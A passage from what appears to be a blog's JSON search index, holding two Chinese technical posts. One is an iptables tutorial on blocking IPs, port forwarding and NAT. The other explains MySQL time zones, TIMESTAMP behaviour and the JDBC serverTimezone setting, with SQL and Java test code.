禁止 ip 访问后端 IP 在 192.168.64.6 上增加规则：\n# -A INPUT: 将规则添加到 INPUT 链，表示处理进入的流量 # -s 192.168.64.7: 指定源 IP 地址，即要阻止的 IP # -d 192.168.64.6: 指定目标 IP 地址，即后端 IP # -j DROP: 表示丢弃匹配的流量 iptables -A INPUT -s 192.168.64.7 -d 192.168.64.6 -j DROP # -j REJECT: 丢弃流量的同时向源 IP 返回一个拒绝消息。请求方直接提示：Connection refused iptables -A INPUT -s 192.168.64.7 -d 192.168.64.6 -j REJECT # -p 指定协议类型为 TCP # --dport 指定目标端口 iptables -A INPUT -s 192.168.64.7 -d 192.168.64.6 -p tcp --dport 80 -j REJECT # 看当前的 iptables 规则 # -L \u0026#34;list\u0026#34;，列出当前的规则 # -n \u0026#34;numeric\u0026#34;，即使用数字 IP 地址和端口号而不是主机名和服务名 # -v \u0026#34;verbose\u0026#34;，显示详细信息 iptables -L -n -v # 列出带编号的规则 iptables -L --line-numbers # 删除 INPUT 链中的第 1 条规则 # 注意！删除成功后序号会改变，需要重新查询序号 iptables -D INPUT 1 # 清除 INPUT 链所有规则 iptables -F INPUT # 清除当前活跃的表（未指定默认是 filter 表）的所有 iptables 规则 # 等同于 iptables -F -t filter iptables -F 2. 端口转发 默认情况下，Linux 系统不会转发目的 IP 地址不是本地网络的 IPv4 数据包。这是出于安全考虑，防止系统意外成为恶意流量的转发表。要启用 IPv4 数据包转发功能，需要修改内核参数 net.ipv4.ip_forward\n需要注意，上面的命令仅临时启用 IPv4 数据包。需要永久启用转发，需要修改 /etc/sysctl.conf 文件。 在该文件中添加或修改 net.ipv4.ip_forward=1 一行。 然后运行 sudo sysctl -p 应用更改\ncat /proc/sys/net/ipv4/ip_forward sudo sysctl -w net.ipv4.ip_forward=1 将本机的 8080 端口转发到 80 端口 iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 80 # curl 127.0.0.1:8080 # curl 192.168.64.6:8080 # curl: (7) Failed to connect to 127.0.0.1 port 8080 after 1 ms: Couldn\u0026#39;t connect to server # 非本机访问 ok # curl 192.168.64.6:8080 PREROUTING 链修改的是从外部连接过来时的转发，所以上面的方式本机 curl 127.0.0.1:8080 会提示：Couldn\u0026rsquo;t connect to server\n如果本机连接到本机的转发，需要修改为 OUTPUT 链：\n# 清除已有 nat 规则 # iptables -F -t nat iptables -t nat -A OUTPUT -p tcp --dport 8080 -j REDIRECT --to-port 80 # 非本机访问失败： # curl 192.168.64.6:8080 # curl: (7) Failed to connect to 192.168.64.6 port 8080 after 1 ms: Connection refused # 本机访问 ok # curl 192.168.64.6:8080 # curl 127.0.0.1:8080 转发内网 IP 在 192.168.64.6 上增加规则：\n# 清除已有 nat 规则 # iptables -F -t nat iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.64.7:80 iptables -t nat -A POSTROUTING -p tcp -d 192.168.64.7 --dport 80 -j SNAT --to-source 192.168.64.6 转发公网的 IP 和端口 # 清除已有 nat 规则 # iptables -F -t nat iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 106.55.113.110:80 # --to-source 使用公网地址会无法访问 iptables -t nat -A POSTROUTING -p tcp -d 106.55.113.110 --dport 80 -j SNAT --to-source 192.168.64.6 需要注意的是 SNAT 的 --to-source 需要设置为连接公网的网卡对应的内网 IP（通过 ip ad 查询），如果设置为公网 IP，数据包可能被丢弃\n3. 内部 IP 共享上网 NAT 目的是为了解决 IPv4 公网 IP 不足的问题：\n当私有网络中的设备发送数据包到公共网络时，NAT 设备会将数据包的 源IP地址（内网 IP）从私有地址转换为 公共IP地址，并维护一个转换表，记录所有的地址转换关系 NAT 设备接收数据包时，会根据转换表将数据包的目标 IP 地址转换为内部设备的内网 IP，并将其发送到内部网络 包含的操作：\nSNAT (Source Network Address Translation)：修改数据包的源 IP 地址 DNAT (Destination Network Address Translation)：修改数据包的目的 IP 地址 MASQUERADE：和 SNAT 类似，但是对每个包都会动态获取指定输出接口（网卡）的 IP，因此如果接口的 IP 地址发送了变化，MASQUERADE 规则不受影响 举个 NAT 的例子：村民张三需要写信给河南的李四，写完后他在信封上写上，寄件人地址：勤劳村 8 号，收件人地址：河南省孟津县陈倪路 20 号。然后就把这封信投递到村里的邮局。邮递员拿到信件一看，这信要是寄出去，收件人通过 勤劳村 8 号 这个回信肯定没办法寄回村里，于是就将信封上寄件人地址修改为：四川省兴文县勤劳村邮局，再将信件发出，同时在本子上记录发往河南的这封信对应的是 勤劳村 8 号。 李四收到信件就按照信件上的信息编写信封，寄件人地址：河南省孟津县陈倪路 20 号，收件人地址：四川省兴文县勤劳村邮局，这样这封回信就寄到了村里的邮局，邮递员一看到这封信是来自河南，对着笔记本就知道这封信是送往 勤劳村 8 号，于是将收件人地址修改为了 勤劳村 8 号，这样邮递员派件的时候就可以把回信送到张三家\n详细 NAT 原理可以参考这篇文章：[译] NAT 穿透是如何工作的：技术原理及企业级实践\n实践 我是按着 使用iptables将ubuntu配置为路由器 进行操作，最后的效果：客户端可以通过连接一台配置了 SNAT 或者 MASQUERADE 的机器访问公网\n注意：给网关和客户端指定 vmnet15 后还需要手动配置一下 虚拟网络：\n网关 IP 配置：\nnetwork: version: 2 ethernets: ens33: # WAN 接口 dhcp4: true ens34: # LAN 接口 dhcp4: no addresses: [10.1.2.1/24] 客户端配置：\nnetwork: version: 2 ethernets: ens33: dhcp4: no addresses: [10.1.2.2/24] gateway4: 10.1.2.1 # 网关 nameservers: addresses: [114.114.114.114] 在网关机器上进行 iptables 的配置：\nsudo sysctl -w net.ipv4.ip_forward=1 # 将 10.1.2.0/24 网络中的所有主机伪装成 192.168.184.131 这个公网IP地址，以便它们可以访问外部网络 # -o ens33: 匹配通过 ens33 接口出站的数据包 iptables -t nat -A POSTROUTING -s 10.1.2.0/24 -o ens33 -j SNAT --to-source 192.168.184.131 这条命令允许内部网络的设备通过网关访问互联网。内部设备的 IP 地址在数据包离开网关时被替换为网关的公共 IP 地址，从而使外部网络只看到网关的 IP 地址，除了 SNAT 还可以使用 MASQUERADE，二者效果类似\niptables -t nat -A POSTROUTING -s 10.1.2.0/24 -j MASQUERADE 理解 iptables 表:\nfilter 表: 这是默认表，用于过滤数据包，决定是否允许数据包通过 nat 表: 用于网络地址转换 (Network Address Translation, NAT)。它主要用于修改数据包的源地址或目标地址，例如将私有 IP 地址转换为公有 IP 地址 mangle 表: 用于修改数据包的头部信息，例如修改 TTL (Time To Live) 值、TOS (Type of Service) 值等 raw 表: 用于在连接跟踪之前处理数据包，主要用于控制连接跟踪是否启用 security 表: (较新版本) 用于安全策略的实施，例如 SELinux 链：\nPREROUTING INPUT FORWARD OUTPUT POSTROUTING 数据包的不同场景：\n收到的、目的是本机的包：PRETOUTING -\u0026gt; INPUT 收到的、目的是其他主机的包：PRETOUTING -\u0026gt; FORWARD -\u0026gt; POSTROUTING 本地产生的包：OUTPUT -\u0026gt; POSTROUTING 图片来自：从零开始认识 iptables\n表包含若干个链：\nfilter 表包含三个链：INPUT, FORWARD, OUTPUT nat 表包含三个链：PREROUTING, POSTROUTING, OUTPUT mangle 表五个链都包含 raw 表包含两个链：PREROUTING, OUTPUT 看到这些排列组合，可能已经凌乱了，可以看下面的这张图，conntrack 理解为 raw 表，来自：Netfilter Kernel (Packet) Traversal\nNetfilter 内核数据包遍历就像保卫萝卜（塔防游戏）一样，数据包就像游戏中的怪物，会按照特定的路径移动，链就像在特定位置安置的炮塔，当数据包经过某个链时，链就会对数据包进行一些操作，链中包含若干条规则\n既然已经有了链，可以在数据包的不同阶段执行特定操作，为什么还需要表呢？原因是不同规则的执行顺序可能会影响结果。比如，有两条规则：\n对数据包执行 SNAT 对数据包的源 IP 进行过滤 如果先执行 SNAT，过滤操作会基于 SNAT 修改后的 IP 和端口进行匹配。但如果先执行过滤，数据包可能在 SNAT 应用之前就被过滤掉了。每个表的操作结果都会影响后续表的处理，所以 表的作用是将规则按照功能进行分类，避免执行顺序导致规则失效。表的处理顺序：raw -\u0026gt; mangle -\u0026gt; nat -\u0026gt; filter\n注意：相同表中相同链中如果多个规则匹配同一个数据包，则只有第一个匹配的规则会被执行\n需要注意的是，在使用 iptables 命令时，如果没有指定表，默认表是 filter（最后处理的那个表）\n# 手动指定 -t 为 nat 表 iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 80 持久化 iptables 规则存储在内存中，系统重启后规则会丢失，可以安装 iptables-persistent 来持久化规则，规则保存在 /etc/iptables/rules.v4\nsudo apt update sudo apt install iptables-persistent 配置好 iptables 规则后，需要手动运行以下命令持久化规则：\nsudo netfilter-persistent save 误改规则，通过该命令将规则恢复到持久化存储的状态：\nsudo netfilter-persistent reload 参考资料 iptables - wiki iptables的四表五链与NAT工作原理 iptables做TCP/UDP端口转发【转】 通过iptables实现端口转发和内网共享上网 iptables error: unknown option \u0026ndash;dport How iptables tables and chains are traversed [译] NAT - 网络地址转换（2016） [译] 深入理解 iptables 和 netfilter 架构 VMware实现iptables NAT及端口映射\n","permalink":"https://aaronlinv.github.io/posts/%E9%87%8D%E6%8B%BE-iptables/","summary":"\u003cp\u003eiptables 是一个常看常忘的命令，本文试图从应用的角度理解它\u003c/p\u003e\n\u003cp\u003eiptables 是运行在用户空间的应用软件，通过控制 Linux 内核 netfilter 模块，来管理网络数据包的处理和转发\u003c/p\u003e\n\u003ch2 id=\"一些常用的场景\"\u003e一些常用的场景\u003c/h2\u003e\n\u003ch3 id=\"1-禁止-ip-访问后端-ip\"\u003e1. 禁止 ip 访问后端 IP\u003c/h3\u003e\n\u003cp\u003e在 \u003ccode\u003e192.168.64.6\u003c/code\u003e 上增加规则：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -A INPUT: 将规则添加到 INPUT 链，表示处理进入的流量\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -s 192.168.64.7: 指定源 IP 地址，即要阻止的 IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -d 192.168.64.6: 指定目标 IP 地址，即后端 IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -j DROP: 表示丢弃匹配的流量\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -A INPUT -s 192.168.64.7 -d 192.168.64.6 -j DROP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -j REJECT: 丢弃流量的同时向源 IP 返回一个拒绝消息。请求方直接提示：Connection refused\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -A INPUT -s 192.168.64.7 -d 192.168.64.6 -j REJECT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -p 指定协议类型为 TCP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# --dport 指定目标端口\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -A INPUT -s 192.168.64.7 -d 192.168.64.6 -p tcp --dport \u003cspan class=\"m\"\u003e80\u003c/span\u003e -j REJECT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 看当前的 iptables 规则\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -L \u0026#34;list\u0026#34;，列出当前的规则\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -n \u0026#34;numeric\u0026#34;，即使用数字 IP 地址和端口号而不是主机名和服务名\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -v \u0026#34;verbose\u0026#34;，显示详细信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -L -n -v\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 列出带编号的规则\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -L --line-numbers\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 删除 INPUT 链中的第 1 条规则\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 注意！删除成功后序号会改变，需要重新查询序号\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -D INPUT \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 清除 INPUT 链所有规则\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -F INPUT  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 清除当前活跃的表（未指定默认是 filter 表）的所有 iptables 规则\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 等同于 iptables -F -t filter\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -F\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"2-端口转发\"\u003e2. 端口转发\u003c/h3\u003e\n\u003cp\u003e默认情况下，Linux 系统不会转发目的 IP 地址不是本地网络的 IPv4 数据包。这是出于安全考虑，防止系统意外成为恶意流量的转发表。要启用 IPv4 数据包转发功能，需要修改内核参数 \u003ccode\u003enet.ipv4.ip_forward\u003c/code\u003e\u003c/p\u003e","title":"重拾 iptables"},{"content":"TL;DR 手动为 MySQL 指定非偏移量的时区，以避免 TIMESTAMP 类型夏令时问题和时区转化性能瓶颈 TIMESTAMP 范围：\u0026lsquo;1970-01-01 00:00:01\u0026rsquo; UTC to \u0026lsquo;2038-01-19 03:14:07\u0026rsquo; 连接 MySQL 数据库时，serverTimezone 参数用于指定数据库服务器的时区，需要设置为与 MySQL 服务端相同的时区 MySQL 时区设置影响 TIMESTAMP 类型数据和部分时间函数 MySQL 会话时区设置会影响 TIMESTAMP 和 时间函数（NOW()、CURDATE()、CURTIME()、CURRENT_TIMESTAMP()）\n存储 TIMESTAMP 类型数据时，MySQL 会根据当前会话的时区将时间转换为 UTC 时间，MySQL 实际存储的是 UTC 时间。检索时 MySQL 根据会话的时区将存储的 UTC 时间转换为会话对应时区的时间。而 DATETIME 类型的字段存储的时间值是原始值，不受时区影响\nMySQL 默认使用 SYSTEM 时区（即操作系统的时区），每个需要时区计算的 MySQL 函数调用都会调用系统库来确定当前系统时区。此调用可能受到全局互斥体的保护，从而导致争用，建议显式设置时区\n查询当前时区 # time_zone：MySQL 使用 SYSTEM 的时区 # system_time_zone：SYSTEM 为 CST 时区 show variables like \u0026#34;%time_zone%\u0026#34;; +------------------+--------+ | Variable_name | Value | +------------------+--------+ | system_time_zone | CST | | time_zone | SYSTEM | +------------------+--------+ 不同会话时区对 时间函数 的影响 # 当前时区 # 查看当前的全球和会话时区值 SELECT @@GLOBAL.time_zone, @@SESSION.time_zone; SELECT NOW(), CURDATE(), CURTIME(), CURRENT_TIMESTAMP(); set time_zone = \u0026#39;America/New_York\u0026#39;; SELECT NOW(), CURDATE(), CURTIME(), CURRENT_TIMESTAMP(); 不同会话时区对 TIMESTAMP 类型的影响 # UTC +8 set time_zone = \u0026#39;Asia/Shanghai\u0026#39;; CREATE TABLE events ( id INT AUTO_INCREMENT PRIMARY KEY, event_name VARCHAR(255) NOT NULL, event_timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP, event_datetime DATETIME DEFAULT CURRENT_TIMESTAMP ); INSERT INTO events (event_name, event_timestamp, event_datetime) VALUES (\u0026#39;10.24 15:45:00\u0026#39;, \u0026#39;2022-10-24 15:45:00\u0026#39;, \u0026#39;2022-10-24 15:45:00\u0026#39;); INSERT INTO events (event_name, event_timestamp, event_datetime) VALUES (\u0026#39;12.24 15:45:00\u0026#39;, \u0026#39;2022-12-24 15:45:00\u0026#39;, \u0026#39;2022-12-24 15:45:00\u0026#39;); SELECT * FROM events; +----+----------------+---------------------+---------------------+ | id | event_name | event_timestamp | event_datetime | +----+----------------+---------------------+---------------------+ | 1 | 10.24 15:45:00 | 2022-10-24 15:45:00 | 2022-10-24 15:45:00 | | 2 | 12.24 15:45:00 | 2022-12-24 15:45:00 | 2022-12-24 15:45:00 | +----+----------------+---------------------+---------------------+ 2 rows in set (0.00 sec) # 仅修改当前会话的时区 set time_zone = \u0026#39;America/New_York\u0026#39;; SELECT * FROM events; +----+----------------+---------------------+---------------------+ | id | event_name | event_timestamp | event_datetime | +----+----------------+---------------------+---------------------+ | 1 | 10.24 15:45:00 | 2022-10-24 03:45:00 | 2022-10-24 15:45:00 | \u0026lt;- 夏令时，相差 12 小时 | 2 | 12.24 15:45:00 | 2022-12-24 02:45:00 | 2022-12-24 15:45:00 | \u0026lt;- 平时相差 13 小时 +----+----------------+---------------------+---------------------+ 2 rows in set (0.00 sec) 纽约 UTC 时差通常为 UTC-5（EST），夏令时为 UTC-4（EDT），所以将原本的会话从上海(UTC+8) 转到纽约时，TIMESTAMP 相差了 13 或 12(夏令时) 小时，所以为了自动转换夏令时，指定时区最好使用时区名词 Asia/Shanghai，避免使用偏移量：'+08:00'\nJDBC 连接 MySQL 时 serverTimezone 对于 TIMESTAMP 类型的影响 连接 MySQL 时我们使用 URL：jdbc:mysql://192.168.1.2:3306/mydb?useSSL=false\u0026amp;serverTimezone=Asia/Shanghai\n这里的 serverTimezone 参数用于指定连接到 MySQL 数据库时所使用的时区，不显示指定使用 JVM 默认时区\nMySQL 服务端处理 TIMESTAMP ：写入时根据会话时区转为 UTC 时间戳存储，读取时将 UTC 还原为会话时区的时间，保证了写入和读取数据的一致。数据库会话时区与 JVM 时区相同时，JVM 读写的 TIMESTAMP 一致，如果不一致就会出现问题，serverTimezone 就是为了告诉 JDBC 从 MySQL 服务端获取到的 TIMESTAMP 是什么时区，知道了它所使用的时区，JDBC 就可以进行预处理\nMyBatis 在处理 TIMESTAMP 类型的数据时会有一些差异，实体映射为 Timestamp 或 Date 在读写时会进行上面提到的预处理，而 LocalDateTime 则不会\nJDBC 读取 TIMESTAMP 类型数据时 JDBC 执行命令时，调用不同的 ResultSet 方法会有不同结果：\nResultSet 的 getString 方法：直接读取时间，即直接返回 数据库根据会话时区转化后的时间 ResultSet 的 getTimestamp 方法：将 数据库根据会话时区转化后的时间 根据 serverTimezone 设置的时区进行转化，得到 数据库根据会话时区转化后的时间 对应的 UTC 时间毫秒戳，然后将这个 UTC 毫秒时间戳转换为 Timestamp 类型（它本身不包含时区信息），打印时会根据 JVM 的时区转化为对应的时区时间 getTimestamp 转化 Timestamp 的源码在：com.mysql.cj.result.SqlTimestampValueFactory\n这里的 this.connectionTimeZone 就是连接 url 中指定的 serverTimezone\n假设 MySQL 默认设置的会话时区为 Asia/Shanghai，通过默认会话读取该 TIMESTAMP 的值为：2022-10-24 15:45:00。而 MySQL 实际存储的 TIMESTAMP 为 UTC 时间：2022-10-24 07:45:00。MySQL JDBC 驱动通过默认会话获取该值时，MySQL 会自动根据默认时区提供转化好时间：2022-10-24 15:45:00，驱动则会根据 serverTimezone 配置的时区，将 MySQL 的时间转化为 Calendar 对象，通过 c.getTimeInMillis() 获取对应的 UTC 时间戳，用于创建 Timestamp 对象\nJDBC 写入 TIMESTAMP 类型： now()写入，数据库 server 端会获取数据库当前时区 按照字符串写入：MySQL 服务端根据会话时区转成对应的 UTC 毫秒数存储 通过变量绑定写入：传入 Timestamp 对象，JDBC 将其编码为 serverTimezone 所代表的时间字符串，类似：2022-06-22 03:29:29，然后发送给 MySQL 服务端 验证 import org.junit.jupiter.api.Test; import java.sql.*; import java.util.TimeZone; public class JDBCTest { private static String url = \u0026#34;jdbc:mysql://host:3306/mydb?useSSL=false\u0026amp;serverTimezone=UTC\u0026#34;; private static String username = \u0026#34;root\u0026#34;; private static String password = \u0026#34;\u0026#34;; @Test void testInsertTimestamp() { TimeZone.setDefault(TimeZone.getTimeZone(\u0026#34;Asia/Shanghai\u0026#34;)); try (Connection connection = DriverManager.getConnection(url, username, password); PreparedStatement ps = connection .prepareStatement(\u0026#34;insert into events(id,event_name,event_timestamp,event_datetime) values (1,\u0026#39;now()\u0026#39;,now(),now())\u0026#34;);) { ps.execute(); }catch (Exception e){ e.printStackTrace(); } try (Connection connection = DriverManager.getConnection(url, username, password); PreparedStatement ps = connection .prepareStatement(\u0026#34;insert into events(id,event_name,event_timestamp,event_datetime) values (2,\u0026#39;2022-06-22 03:29:29\u0026#39;,\u0026#39;2022-06-22 03:29:29\u0026#39;, \u0026#39;2022-06-22 03:29:29\u0026#39;)\u0026#34;);) { ps.execute(); }catch (Exception e){ e.printStackTrace(); } try (Connection connection = DriverManager.getConnection(url, username, password); PreparedStatement ps = connection .prepareStatement(\u0026#34;insert into events(id,event_name,event_timestamp,event_datetime) values (3,\u0026#39;1733539800000L\u0026#39;,?,?)\u0026#34;)) { // Sat Dec 07 2024 02:50:00 GMT+0000 // Sat Dec 07 2024 10:50:00 GMT+0800 (中国标准时间) long timestamp = 1733539800000L; Timestamp ts1 = new Timestamp(timestamp); Timestamp ts2 = new Timestamp(timestamp); ps.setTimestamp(1, ts1); ps.setTimestamp(2, ts2); ps.execute(); // 根据 serverTimezone 将 Timestamp 预处理为 UTC 时间：2024-12-07 02:50:00 // 相当于执行下列 SQL // insert into events(id,event_name,event_timestamp,event_datetime) values (3,\u0026#39;1733539800000L\u0026#39;,\u0026#39;2024-12-07 02:50:00\u0026#39;,\u0026#39;2024-12-07 02:50:00\u0026#39;) }catch (Exception e){ e.printStackTrace(); } } @Test void testGetTimestamp() { TimeZone.setDefault(TimeZone.getTimeZone(\u0026#34;Asia/Shanghai\u0026#34;)); try (Connection connection = DriverManager.getConnection(url, username, password); PreparedStatement ps = connection .prepareStatement(\u0026#34;select * from events where id=3\u0026#34;); ResultSet rs = ps.executeQuery();) { while (rs.next()) { // getTimestamp is 2024-12-07 10:50:00.0 // 根据 serverTimezone，认定数据库时区为 UTC，转化为 本地 Asia/Shanghai 需要 +8，则预处理为：2024-12-07 10:50:00.0 System.out.println(\u0026#34;getTimestamp is \u0026#34; + rs.getTimestamp(\u0026#34;event_timestamp\u0026#34;)); // getString is 2024-12-07 02:50:00 System.out.println(\u0026#34;getString is \u0026#34; + rs.getString(\u0026#34;event_datetime\u0026#34;)); } }catch (Exception e){ e.printStackTrace(); } } } 实验环境： MySQL 8.0.40 mysql-connector-j 9.1.0 mybatis-spring-boot-starter 3.0.4\n参考资料 7.1.15 MySQL Server Time Zone Support 13.2.2 The DATE, DATETIME, and TIMESTAMP Types 一文讲透MySQL driver读取时间时的时区处理 修改mysql时区的三种方法 MySQL 中存储时间的最佳实践\n","permalink":"https://aaronlinv.github.io/posts/mysql-%E6%97%B6%E5%8C%BA%E4%B8%8E-servertimezone/","summary":"\u003ch2 id=\"tldr\"\u003eTL;DR\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e手动为 MySQL 指定非偏移量的时区，以避免 \u003ccode\u003eTIMESTAMP\u003c/code\u003e 类型夏令时问题和时区转化性能瓶颈\u003c/li\u003e\n\u003cli\u003eTIMESTAMP 范围：\u0026lsquo;1970-01-01 00:00:01\u0026rsquo; UTC to \u0026lsquo;2038-01-19 03:14:07\u0026rsquo;\u003c/li\u003e\n\u003cli\u003e连接 MySQL 数据库时，serverTimezone 参数用于指定数据库服务器的时区，需要设置为与 MySQL 服务端相同的时区\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"mysql-时区设置影响-timestamp-类型数据和部分时间函数\"\u003eMySQL 时区设置影响 TIMESTAMP 类型数据和部分时间函数\u003c/h2\u003e\n\u003cp\u003eMySQL 会话时区设置会影响 \u003ccode\u003eTIMESTAMP\u003c/code\u003e 和 时间函数（NOW()、CURDATE()、CURTIME()、CURRENT_TIMESTAMP()）\u003c/p\u003e\n\u003cp\u003e存储 \u003ccode\u003eTIMESTAMP\u003c/code\u003e 类型数据时，MySQL 会根据当前会话的时区将时间转换为 UTC 时间，MySQL 实际存储的是 UTC 时间。检索时 MySQL 根据会话的时区将存储的 UTC 时间转换为会话对应时区的时间。而 DATETIME 类型的字段存储的时间值是原始值，不受时区影响\u003c/p\u003e\n\u003cp\u003eMySQL 默认使用 SYSTEM 时区（即操作系统的时区），每个需要时区计算的 MySQL 函数调用都会调用系统库来确定当前系统时区。此调用可能受到全局互斥体的保护，从而导致争用，建议显式设置时区\u003c/p\u003e\n\u003ch3 id=\"查询当前时区\"\u003e查询当前时区\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sql\" data-lang=\"sql\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e#\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003etime_zone\u003c/span\u003e\u003cspan class=\"err\"\u003e：\u003c/span\u003e\u003cspan class=\"n\"\u003eMySQL\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e使用\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eSYSTEM\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e的时区\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"o\"\u003e#\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003esystem_time_zone\u003c/span\u003e\u003cspan class=\"err\"\u003e：\u003c/span\u003e\u003cspan class=\"k\"\u003eSYSTEM\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e为\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eCST\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e时区\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eshow\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003evariables\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003elike\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;%time_zone%\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan 